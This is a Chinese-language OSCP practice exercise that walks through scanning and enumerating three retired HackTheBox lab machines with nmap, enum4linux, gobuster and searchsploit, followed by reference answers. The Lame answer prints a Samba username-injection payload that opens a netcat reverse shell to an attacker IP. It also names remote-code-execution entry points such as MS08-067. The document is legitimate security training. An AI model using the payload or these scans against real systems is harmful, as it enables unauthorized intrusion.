# 練習 A — 完整枚舉 3 台 HTB 機器

> 目標：把 Ch 6–9 的枚舉技術全部用上，對 3 台 HTB 機器做完整的情報蒐集，不打漏洞，只枚舉。

## 練習說明

這個練習**不要求你打下機器**，只要求你枚舉得夠徹底。目的是建立肌肉記憶：看到機器 → 知道要跑哪些指令 → 知道如何解讀輸出。

OSCP 考試中，枚舉做得越徹底，打漏洞就越有方向。這個習慣現在就要養。

## 三台目標機器

全部是 HackTheBox 的免費 Retired 機器（需要 VIP 才能啟動，或用 Writeup 參考輸出）：

| 機器 | OS | 難度 | 主要枚舉點 |
|------|-----|------|----------|
| **Lame** | Linux | Easy | FTP, SMB, Distccd |
| **Legacy** | Windows | Easy | SMB（Windows XP） |
| **Grandpa** | Windows | Easy | HTTP（IIS 6.0 WebDAV） |

如果沒有 HTB VIP，用 **TryHackMe** 的免費機器替代：
- Blue（Windows SMB）
- Basic Pentesting（Linux 多服務）

## 任務規格

對每台機器，完成以下 checklist：

### Tier 1：Port 和服務清單

```
□ 全 port TCP 掃描（-p-）
□ 針對開放 port 的版本 + 腳本掃描（-sC -sV）
□ UDP 掃 top-20（-sU --top-ports 20）
□ 輸出全部存進 nmap/ 目錄
□ 整理一份「開放服務 + 版本號」清單
```

### Tier 2：服務專項枚舉

```
□ Port 21（FTP）：嘗試匿名登入，列目錄
□ Port 139/445（SMB）：enum4linux -a，smbclient -L
□ Port 80/443（HTTP）：curl -I，gobuster dir，nikto
□ 其他服務：視情況用對應工具
```

### Tier 3：漏洞搜尋

```
□ 對每個有版本號的服務跑 searchsploit
□ 記錄找到哪些相關 exploit（不一定要執行）
□ 標注哪個 exploit 看起來最有希望
```

## 記錄格式

每台機器建立一個目錄，照這個格式記筆記：

```markdown
# 機器名：Lame
IP：10.10.10.3

## 開放服務
| Port  | 服務      | 版本         |
|-------|-----------|--------------|
| 21    | FTP       | vsftpd 2.3.4 |
| 22    | SSH       | OpenSSH 4.7p1 |
| 139   | NetBIOS   | Samba 3.X    |
| 445   | SMB       | Samba 3.0.20 |
| 3632  | distccd   | distccd v1   |

## FTP 枚舉
- 匿名登入：是/否
- 目錄內容：...

## SMB 枚舉
- enum4linux 輸出重點：
  - 使用者：...
  - 分享：...
  - 密碼政策：...

## 漏洞搜尋
- vsftpd 2.3.4：找到 exploit 17491.py（後門，需 port 6200）
- Samba 3.0.20：找到 usermap_script RCE（Metasploit 和手動版）
- distccd：找到 CVE-2004-2687（RCE）

## 最可能的入口
1. Samba usermap_script（RCE，不需認證）
2. vsftpd 後門
```

## Step-by-Step 指引

### Lame（Linux）

```bash
TARGET="10.10.10.3"
mkdir -p ~/htb/lame/{nmap,exploit,loot}

# Step 1：全 port 掃
nmap -p- --min-rate 5000 -T4 -oN ~/htb/lame/nmap/allports.txt $TARGET

# Step 2：詳細掃（把上一步找到的 port 填進去）
nmap -p 21,22,139,445,3632 -sC -sV -oN ~/htb/lame/nmap/detail.txt $TARGET

# Step 3：UDP
sudo nmap -sU --top-ports 20 -oN ~/htb/lame/nmap/udp.txt $TARGET

# Step 4：SMB 枚舉
enum4linux -a $TARGET | tee ~/htb/lame/enum4linux.txt
smbclient -L //$TARGET -N

# Step 5：FTP
nmap -p 21 --script ftp-anon $TARGET

# Step 6：漏洞搜尋
searchsploit vsftpd 2.3.4
searchsploit samba 3.0.20
searchsploit distccd
```

### Legacy（Windows）

```bash
TARGET="10.10.10.4"
mkdir -p ~/htb/legacy/{nmap,exploit,loot}

# Step 1
nmap -p- --min-rate 5000 -T4 -oN ~/htb/legacy/nmap/allports.txt $TARGET

# Step 2（Legacy 主要開 139,445,3389）
nmap -p 139,445,3389 -sC -sV -oN ~/htb/legacy/nmap/detail.txt $TARGET

# Step 3：SMB 漏洞掃（Windows XP 很可能有 MS08-067）
nmap -p 445 --script smb-vuln-ms08-067,smb-vuln-ms17-010 \
    -oN ~/htb/legacy/nmap/smb-vuln.txt $TARGET

# Step 4：枚舉
enum4linux -a $TARGET | tee ~/htb/legacy/enum4linux.txt

# Step 5：漏洞搜尋
searchsploit "windows xp smb"
searchsploit ms08-067
```

### Grandpa（Windows IIS）

```bash
TARGET="10.10.10.14"
mkdir -p ~/htb/grandpa/{nmap,exploit,loot}

# Step 1
nmap -p- --min-rate 5000 -T4 -oN ~/htb/grandpa/nmap/allports.txt $TARGET

# Step 2（主要開 80）
nmap -p 80 -sC -sV -oN ~/htb/grandpa/nmap/detail.txt $TARGET

# Step 3：Web 枚舉
curl -I http://$TARGET
curl http://$TARGET/robots.txt
gobuster dir -u http://$TARGET \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -o ~/htb/grandpa/gobuster.txt

# Step 4：WebDAV 枚舉（IIS 常啟用 WebDAV）
nmap -p 80 --script http-webdav-scan $TARGET
davtest -url http://$TARGET   # 測試可上傳的類型

# Step 5：漏洞搜尋
searchsploit "iis 6.0"
searchsploit webdav
```

## 完成標準

| 項目 | 標準 |
|------|------|
| 每台機器的 nmap 輸出 | 3 個檔案（allports, detail, udp） |
| 服務清單 | 所有開放 port 有版本號 |
| SMB 枚舉 | enum4linux 輸出已分析 |
| 漏洞搜尋 | 每台機器找到至少一個相關 exploit |
| 筆記 | 每台機器有完整筆記，包含「最可能入口」 |

## 參考解答

**先自己做完再看！**

<details>
<summary>點開查看 Lame 枚舉結果分析</summary>

### Lame 服務清單
```
21/tcp  open  ftp     vsftpd 2.3.4
22/tcp  open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd  distccd v1 ((GNU) 4.2.4)
```

### 關鍵發現
- vsftpd 2.3.4：後門漏洞，但靶機上這個洞被修補了
- Samba 3.0.20：`username map script` 命令注入，無需認證（**主要入口**）
- distccd：CVE-2004-2687，分散式編譯服務 RCE（也能用）

### Samba exploit 說明
Samba 3.0.20 的 `username map script` 設定允許在用戶名中注入 shell 命令：
```
username = "/=`nohup nc -e /bin/sh 10.10.14.5 4444`"
```
這就是 Metasploit 的 `exploit/multi/samba/usermap_script` 在做的事。

</details>

<details>
<summary>點開查看 Legacy 枚舉結果分析</summary>

### Legacy 服務清單
```
135/tcp open  msrpc   Microsoft Windows RPC
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
```

### 關鍵發現
nmap SMB 漏洞腳本輸出：
```
Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
```

Legacy 是 Windows XP，MS08-067 直接 RCE，不需要任何認證。

</details>

## 自我檢核

- [ ] 每台機器都跑了全 port 掃描（不是只掃 top-1000）
- [ ] SMB 枚舉用了 enum4linux 或 smbclient
- [ ] 每個找到的服務都有 searchsploit 過
- [ ] 有一份筆記說明「最可能的入口是什麼，為什麼」

→ [Ch 10 Burp Suite 精通：攔截、Repeater、Intruder](./10-burp-suite.md)
